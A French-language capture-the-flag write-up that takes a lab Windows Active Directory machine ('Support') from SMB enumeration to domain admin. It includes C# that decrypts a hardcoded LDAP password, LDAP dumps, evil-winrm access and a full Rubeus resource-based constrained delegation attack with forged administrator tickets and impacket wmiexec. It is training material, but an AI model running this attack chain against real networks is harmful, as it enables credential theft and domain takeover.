# Support - Easy

scan nmap:

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-05 11:27 EDT
Nmap scan report for 10.10.11.174
Host is up (0.040s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-05 15:27:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

On est clairement sur une machine windows avec un AD.

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)

Rien sur le LDAP pour l’instant, il faudrait un user valide

énumération du SMB (quasi toujours présent sur les machines windows):

```bash
smbmap -H 10.10.11.174 -d support.htb -u anonymous
[+] Guest session   	IP: 10.10.11.174:445	Name: 10.10.11.174                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	support-tools                                     	READ ONLY	support staff tools
	SYSVOL                                            	NO ACCESS	Logon server share
```

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)

On essaye donc de consulter ce qu’on peut lire avec smbclient

On trouve un .exe user_info qui pourrait contenir des logs donc on va essayer de le deassembler avec dnSpy qui semble être pas mal pour les executables .net

On tombe sur ça:

```csharp
// Token: 0x02000006 RID: 6
	internal class Protected
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(Protected.enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
			}
			return Encoding.Default.GetString(array2);
		}

		// Token: 0x04000005 RID: 5
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		// Token: 0x04000006 RID: 6
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
	}
```

On peut alors facilement reconstruire le password vu que c’est toujours le même.

et voici dans quoi sert le password:

```csharp
this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```

En gros c’est le mdp du compte support LDAP je suppose.

Création d’un code à executer pour trouver le mdp:

```csharp
using System.IO;
using System;

class Protected
{
	public static string getPassword()
	{
		byte[] array = Convert.FromBase64String(Protected.enc_password);
		byte[] array2 = array;
		for (int i = 0; i < array.Length; i++)
		{
			array2[i] = (byte)(array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
		}
		return System.Text.Encoding.Default.GetString(array2);
	}

	private static System.String enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

	private static byte[] key = System.Text.Encoding.ASCII.GetBytes("armando");

    static void Main(System.String[] args)
    {
        System.Console.WriteLine("This is the password: " + getPassword());
    }
}
```

```csharp
This is the password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

On peut maintenant executer des query (en faisant bien attention à l’username):

```bash
ldapsearch -x -H ldap://10.10.11.174 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
```

Après avoir executé cette query on obtient un tas d’informations sous cette forme: 

```bash
# ford.victoria, Users, support.htb
dn: CN=ford.victoria,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: ford.victoria
sn: ford
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: victoria
distinguishedName: CN=ford.victoria,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111557.0Z
whenChanged: 20220528111558.0Z
uSNCreated: 13048
uSNChanged: 13063
company: support
streetAddress: Skipper Bowles Dr
name: ford.victoria
objectGUID:: igFAMPhgAEqMFr/4HUIY5A==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982101581183009
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILYAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: ford.victoria
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111558.0Z
dSCorePropagationData: 16010101000000.0Z
mail: ford.victoria@support.htb
```

mais on trouve pas de mdp en clair

on execute cette commande pour dump toutes les infos sur le domaine

```bash
ldapdomaindump 10.10.11.174 -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --no-json --no-grep
```

On voit que le compte support à accès au management à distance → winrm ? evilwinrm ?

```bash
gem install evil-winrm
```

On retrouve dans la query cette ligne pour le compte support qui nous interesse, mdp ?

```bash
info: Ironside47pleasure40Watchful
```

evilwinrm passe avec ce mdp pour support !

on est connecté en tant que support donc on récupère le flag user.

à partir de là je ne sais pas trop quoi faire donc winpeas

```bash
wget http://ip:8000/winPEAS.bat -OutFile winPEAS.bat
```

access denied presque de partout pour winPEAS + trouvé aucun fichier interessant

on se référe à la bible: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

[https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

on va essayer un coup de mimikatz → ne marche pas 😟

[https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)

Il nous faut Rubeus, powermad et powerview

on peut upload direct via evil-winrm pour faciliter la tâche

Chaque étape:

Rajouter un computer object:

```powershell
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```powershell
Set-ADComputer "dc" -PrincipalsAllowedToDelegateToAccount SERVICEA$
Get-ADComputer "dc" -Properties PrincipalsAllowedToDelegateToAccount
```

Créer le hash de notre faux PC:

```powershell
.\Rubeus.exe hash /password:123456 /user:SERVICEA$ /domain:support.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Calculate Password Hash(es)

[*] Input password             : 123456
[*] Input username             : SERVICEA$
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBhostservicea.support.htb
[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
[*]       aes128_cts_hmac_sha1 : F6BF2C8FE53632C726D1B4C9A2699EB6
[*]       aes256_cts_hmac_sha1 : A7D5A56B29A33F4068C10A7AFD1B5A9A9688256CFFFB00D27ED769A9CDFE82A0
[*]       des_cbc_md5          : 159BBAB57F5DC240
```

Maintenant l’attaque:

```powershell
.\Rubeus.exe s4u /user:SERVICEA$ /aes256:A7D5A56B29A33F4068C10A7AFD1B5A9A9688256CFFFB00D27ED769A9CDFE82A0 /aes128:F6BF2C8FE53632C726D1B4C9A2699EB6 /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```

Résultat:

```powershell
[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: A7D5A56B29A33F4068C10A7AFD1B5A9A9688256CFFFB00D27ED769A9CDFE82A0
[*] Building AS-REQ (w/ preauth) for: 'support.htb\SERVICEA$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFjjCCBYqgAwIBBaEDAgEWooIElTCCBJFhggSNMIIEiaADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD
      AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBE8wggRLoAMCARKhAwIBAqKCBD0EggQ5KT3dxD90
      YQMDtFEXYHrK3IuuERr2z+HZZtDeJawWHJtZteX04BP4kSSE7tVyTOy1TXoVemiSe7dfsCYEkpDzneb8
      clpmwNoGmTZF58veLBlYCINFwxULecypmhL4Qhh11VYT8kzkBbnriZqkW8uqFy1p9FBY2sIs2mBt5OhG
      KKZzXepzc3zWIWx3+FxhN1GBd2RIHA8ECgYP+oOr18r96NeNCQSBssMCTZUYVsJKwopyvAINXs9Yj+I3
      wiyYWnkEfGrCV90geoSNzch3roVKteamjEsVTph6DWY/nrgbM0jbqIkdDTEfymg8zDi8KU1R96ZjxZcq
      p1oJxfFYZNM4IZK5yOKpfGaZTsJfHU/wvgP39YT4AjeElRM/Z+MUJo8U+vyen1S1KCmgQGy9DcQjZYjK
      ByfmUlX6fYAU5DPz+s6vbq9r0u1b0/nLzPi5dUBVkt+oixUoOJIgVjPka7gEgVpVAp8A4gq1wb8L+4fR
      Bku2ePljYyXUx/1kONFpq7X/HtRLpwQKOXTkc561JoMK/FF/3p44yLax6kdPoOY3ZG2W0YEtRKxyLZ/r
      QRqirxwwlYFyx+mUE0o5bgPzecUlWsKF2+Qczc66uFbskgh/VbZRhxs3cfBNx8eSefBCRBtIn+pRaUIj
      jDMbrUjhDKP1Y7DvgUe3zhoZrQ4mSxY5cOMhHWJPon/NdNvCsC4smfTm7wPyPDTHRx/hY94eyb7FWUP1
      q42XgHCzEuPb9zwh74GgKPS53tLJ8N3InEg3T3Y/6EDvzlGQKN4jTNN5X5IragRHHK8A/JyQd86U3XrV
      lCTANpurQBFBgCWt/bPiJCRtpBoYVUzaEdwch5k/NtMqhnaie9Ew6NdYVeoH+rde5I3FHmojq2CUzhWx
      7wQJkPowMwq4Khl0PEcJyVE3OOpRXHneFwlvUhQXnjBANyv8PDLZ0R5XsbT1leEHWSpbs3Nhclou5V6+
      OeJ7ZnOlFgZpMaUqBIDmoCq1mtz4u014o+C7pk996VxtZvGbo8/J9g/c3VhcV+BdLDr2fntWShLnKfgd
      1UEIqJolDk0Wdtfj6hNnYMh97YYw+dVNuFdU+hglDL61TEt4peiS7wgJ4a477FuKe8K2ApVvAOhhLnmh
      hTJmcXvVXFDqHkIYEuAK/OVaTYFfrcUjrjMRzfCELyzDXto2fKxr8AHgxJH0xwWgMCrPBcXfNOPsrSDc
      JBeA0h1VdutmbTuERXLm4NORi256spqo+TCt9D6mVzlYnFKAge1wsq2mtVzyMJEPA6GKJ9I+14WLE1+X
      vU0YT3/47xUR8DKr3zxxFw2iuj1iO4UQ3sAEWj0ACo0XHyVUJeAsQt6KpNIJIWMmjG/P1+f3S06xFrq5
      qEaFZt4IU8iedGCKEl4ojWWVhS49RZAWmRBliCeaaoezNf0GlEMPNrTLr+KKLivwwjKKsT9KX6OB5DCB
      4aADAgEAooHZBIHWfYHTMIHQoIHNMIHKMIHHoCswKaADAgESoSIEIP4EG/lXfKwWaJ+8foJUf3wlYc78
      dFzBhFKZfLH6BjyaoQ0bC1NVUFBPUlQuSFRCohYwFKADAgEBoQ0wCxsJU0VSVklDRUEkowcDBQBA4QAA
      pREYDzIwMjIxMTA2MjIwNTQyWqYRGA8yMDIyMTEwNzA4MDU0MlqnERgPMjAyMjExMTMyMjA1NDJaqA0b
      C1NVUFBPUlQuSFRCqSAwHqADAgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0Yg==

[*] Action: S4U

[*] Building S4U2self request for: 'SERVICEA$@SUPPORT.HTB'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'SERVICEA$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

      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
      CVNFUlZJQ0VBJA==

[*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      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
      MBYbBGNpZnMbDmRjLnN1cHBvcnQuaHRi
[+] Ticket successfully imported!
```

On utilise maintenant impacket et ticketconverter.py

```powershell
wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/ticketConverter.py
pip3 install impacket==0.9.24
pip3 install pyasn1
sudo apt update
sudo apt install krb5-user
```

Le ticket (il est à créer depuis la machine windows pour avoir le bon format, il faut le mettre en base 64):

```powershell
[IO.File]::WriteAllBytes("C:\Users\support\Documents\ticket.kirbi", [Convert]::FromBase64String("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"))
```

```powershell
./ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
```

et enfin:

```powershell
mpacket-wmiexec support.htb/Administrator@dc.support.htb -no-pass -k
```

On obtient le flag root !